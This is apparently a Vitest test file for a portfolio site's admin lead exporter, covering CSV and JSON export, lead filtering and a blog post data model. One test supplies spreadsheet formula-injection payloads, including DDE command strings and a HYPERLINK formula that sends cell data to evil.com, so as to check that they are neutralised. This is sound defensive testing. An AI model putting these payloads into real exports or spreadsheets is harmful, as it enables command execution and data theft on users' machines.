import { describe, it, expect } from "vitest";
import {
  InquiryRecord,
  exportInquiriesToCsv,
  exportInquiriesToJson,
  filterInquiries,
  sanitizeCsvCell,
} from "../app/lib/admin-leads-exporter";
import { BlogPost } from "../app/data/portfolio-data";

describe("Admin Panel & Inbound Lead Engine", () => {
  const sampleLeads: InquiryRecord[] = [
    {
      id: "inq-101",
      name: "Alex Sterling",
      email: "alex@sterlingventures.io",
      phone: "+1 (555) 019-2834",
      projectType: "Distributed Systems Architecture",
      budgetRange: "$15,000 – $30,000 (Full-Stack Platform)",
      message: "Need to scale PostgreSQL and Next.js 16 to 50k DAU with sub-30ms P99 latency.",
      status: "new",
      createdAt: "2026-10-26T10:00:00.000Z",
    },
    {
      id: "inq-102",
      name: "Elena Rostova",
      email: "elena@novatech.co",
      phone: "+44 20 7946 0912",
      projectType: "Database Optimization & High-Throughput Sprints",
      budgetRange: "$5,000 – $15,000 (MVP / Feature Sprint)",
      message: "Query execution timeout on multi-tenant PostgreSQL partition tables during surge hours.",
      status: "reviewed",
      createdAt: "2026-10-25T14:30:00.000Z",
    },
    {
      id: "inq-103",
      name: "Marcus Vance",
      email: "marcus@vancecloud.org",
      projectType: "Fractional Staff Software Engineer Retainer",
      budgetRange: "$10,000 / month",
      message: "Looking for an experienced distributed systems architect for 20 hrs/week fractional retainer.",
      status: "contacted",
      createdAt: "2026-10-24T09:15:00.000Z",
    },
  ];

  describe("RFC 4180 CSV Export & Anti-Formula Injection", () => {
    it("should export inquiries to RFC 4180 CSV with standard headers and CRLF line breaks", () => {
      const csv = exportInquiriesToCsv(sampleLeads);
      const lines = csv.split("\r\n");

      // Verify header row
      expect(lines[0]).toBe(
        '"Inquiry ID","Received Date (UTC)","Client Name","Email Address","Phone Number","Project Type","Budget Range","Status","Requirements Message"'
      );

      // Verify 3 data rows + 1 header row
      expect(lines.length).toBe(4);

      // Verify first lead row contents
      expect(lines[1]).toContain('"inq-101"');
      expect(lines[1]).toContain('"alex@sterlingventures.io"');
      expect(lines[1]).toContain('"Alex Sterling"');
      expect(lines[1]).toContain('"Distributed Systems Architecture"');
      expect(lines[1]).toContain('"new"');
    });

    it("should sanitize malicious spreadsheet formula injection (CWE-1236)", () => {
      // Exploit payloads trying to execute shell commands or exfiltrate data via spreadsheet formulas
      const maliciousLead: InquiryRecord = {
        id: "inq-exploit",
        name: "=cmd|' /C calc'!A0",
        email: "+malicious@payload.com",
        phone: "-123456789",
        projectType: "@SUM(1+1)*cmd|' /C notepad'!A0",
        budgetRange: "\t$25,000",
        message: "\r=HYPERLINK(\"http://evil.com/leak?data=\"&A1,\"Click Here\")",
        status: "new",
        createdAt: "2026-10-26T12:00:00.000Z",
      };

      const csv = exportInquiriesToCsv([maliciousLead]);

      // Every malicious formula character (=, +, -, @, \t, \r) must be neutralized with a leading single quote (')
      expect(csv).toContain("\"'=cmd|' /C calc'!A0\"");
      expect(csv).toContain("\"'+malicious@payload.com\"");
      expect(csv).toContain("\"'-123456789\"");
      expect(csv).toContain("\"'@SUM(1+1)*cmd|' /C notepad'!A0\"");
      expect(csv).toContain("\"'\t$25,000\"");
      expect(csv).toContain("\"'\n=HYPERLINK(\"\"http://evil.com/leak?data=\"\"&A1,\"\"Click Here\"\")\"");
    });

    it("should escape internal double quotes per RFC 4180 standard", () => {
      const leadWithQuotes: InquiryRecord = {
        id: "inq-quote",
        name: 'John "The Architect" Doe',
        email: "john@doe.com",
        projectType: 'Web "3.0" Platform',
        budgetRange: "$10,000",
        message: 'Client says: "Deliver in 4 weeks or else!"',
        status: "new",
        createdAt: "2026-10-26T12:00:00.000Z",
      };

      const csv = exportInquiriesToCsv([leadWithQuotes]);

      // Double quotes inside cells must become double double quotes ("")
      expect(csv).toContain('"John ""The Architect"" Doe"');
      expect(csv).toContain('"Web ""3.0"" Platform"');
      expect(csv).toContain('"Client says: ""Deliver in 4 weeks or else!"""');
    });

    it("should handle undefined and empty values safely without throwing", () => {
      expect(sanitizeCsvCell(undefined)).toBe('""');
      expect(sanitizeCsvCell(null)).toBe('""');
      expect(sanitizeCsvCell("")).toBe('""');
      expect(sanitizeCsvCell(12345)).toBe('"12345"');
    });
  });

  describe("JSON Export Engine", () => {
    it("should export inquiries to cleanly formatted JSON string", () => {
      const jsonStr = exportInquiriesToJson(sampleLeads);
      const parsed = JSON.parse(jsonStr);

      expect(Array.isArray(parsed)).toBe(true);
      expect(parsed.length).toBe(3);
      expect(parsed[0].id).toBe("inq-101");
      expect(parsed[0].name).toBe("Alex Sterling");
      expect(parsed[1].email).toBe("elena@novatech.co");
      expect(parsed[2].status).toBe("contacted");
    });
  });

  describe("Inbound Lead Filtering & Search", () => {
    it("should filter inquiries strictly by status", () => {
      const newOnly = filterInquiries(sampleLeads, "new", "");
      expect(newOnly.length).toBe(1);
      expect(newOnly[0].id).toBe("inq-101");

      const reviewedOnly = filterInquiries(sampleLeads, "reviewed", "");
      expect(reviewedOnly.length).toBe(1);
      expect(reviewedOnly[0].id).toBe("inq-102");

      const contactedOnly = filterInquiries(sampleLeads, "contacted", "");
      expect(contactedOnly.length).toBe(1);
      expect(contactedOnly[0].id).toBe("inq-103");

      const all = filterInquiries(sampleLeads, "all", "");
      expect(all.length).toBe(3);
    });

    it("should filter inquiries by free-text keywords across name, email, and message", () => {
      const byName = filterInquiries(sampleLeads, "all", "elena");
      expect(byName.length).toBe(1);
      expect(byName[0].name).toBe("Elena Rostova");

      const byDomain = filterInquiries(sampleLeads, "all", "sterlingventures.io");
      expect(byDomain.length).toBe(1);
      expect(byDomain[0].name).toBe("Alex Sterling");

      const byKeyword = filterInquiries(sampleLeads, "all", "retainer");
      expect(byKeyword.length).toBe(1);
      expect(byKeyword[0].id).toBe("inq-103");

      const noMatch = filterInquiries(sampleLeads, "all", "nonexistent-query-xyz");
      expect(noMatch.length).toBe(0);
    });

    it("should combine status filter with search keyword", () => {
      // Searching for "PostgreSQL" across all leads matches 2 leads (Alex and Elena)
      const allPostgres = filterInquiries(sampleLeads, "all", "PostgreSQL");
      expect(allPostgres.length).toBe(2);

      // Combining with status "new" should isolate only Alex
      const newPostgres = filterInquiries(sampleLeads, "new", "PostgreSQL");
      expect(newPostgres.length).toBe(1);
      expect(newPostgres[0].name).toBe("Alex Sterling");

      // Combining with status "contacted" should return empty
      const contactedPostgres = filterInquiries(sampleLeads, "contacted", "PostgreSQL");
      expect(contactedPostgres.length).toBe(0);
    });
  });

  describe("Blog Article Media Pipeline & Data Model", () => {
    it("should support coverImageUrl in BlogPost data model and validate URL format", () => {
      const samplePost: BlogPost = {
        id: "blog-test-1",
        title: "Scaling Edge Data Invalidation with Redis & Next.js 16",
        slug: "scaling-edge-data-invalidation",
        excerpt: "An architectural guide to cache invalidation strategies at global edge PoPs.",
        contentMarkdown: "## Architectural Overview\n\nCache invalidation is notoriously difficult...",
        tags: ["Architecture", "Redis", "Next.js"],
        readingTimeMinutes: 8,
        publishedAt: "2026-10-26T12:00:00.000Z",
        isPublished: true,
        coverImageUrl: "/uploads/cache-invalidation-architecture.webp",
      };

      expect(samplePost.coverImageUrl).toBeDefined();
      expect(samplePost.coverImageUrl).toMatch(/\.(webp|png|jpg|jpeg)$/i);
      expect(samplePost.coverImageUrl).not.toContain(".svg");
    });
  });
});
